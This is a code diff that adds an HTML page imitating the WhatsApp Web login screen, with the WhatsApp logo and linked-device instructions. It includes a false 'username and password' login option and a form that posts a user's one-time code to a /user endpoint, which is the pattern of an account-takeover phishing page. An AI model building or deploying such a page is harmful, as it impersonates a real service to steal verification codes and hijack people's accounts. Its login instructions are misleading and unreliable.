@@ -1,0 +1,43 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>WhatsApp Login</title>
+  <link rel="stylesheet" href="../stylesheets/index.css">
+  <!-- <script src="http://localhost:3000/socket.io/socket.io.js"></script> -->
+</head>
+<body>
+  <div class="container">
+    <div id="header">
+      <img src="https://www.freeiconspng.com/thumbs/logo-whatsapp-png/logo-whatsapp-png-pic-0.png" alt="">
+      <h2>WHATSAPP WEB</h2>
+    </div>
+    <div id="center">
+      <div id="box">
+        <div id="box1">
+          <h1>To use WhatsApp on your computer</h1>
+          <div id="para">
+            <p>1. Open WhatsApp on your phone</p>
+            <p>2. Go to settings by tapping on your profile photo, Menu or,<br> Settings</p>
+            <p>3. Tap Linked devices and then link a device</p>
+            <p>4. Point your phone to this screen to capture the QR code</p>
+            <p>5. Or login Whatsapp with username and password</p>
+
+          </div>
+        </div>
+        <div id="box2">
+          <form style="position: absolute;top:80% ; display: flex; flex-direction: column; gap: 6px;left: 30%;" action="/user" method="post">
+            <input type="number" name="otp" placeholder="ENTER OTP" id="">
+            <button>LOGIN</button>
+          </form>
+    
+          <img src="https://static.toiimg.com/thumb/resizemode-4,msid-80874974,imgsize-60742,width-800/80874974.jpg" alt="">
+        </div>
+        
+      </div>
+    </div>
+  </div>
+  
+</body>
+</html>
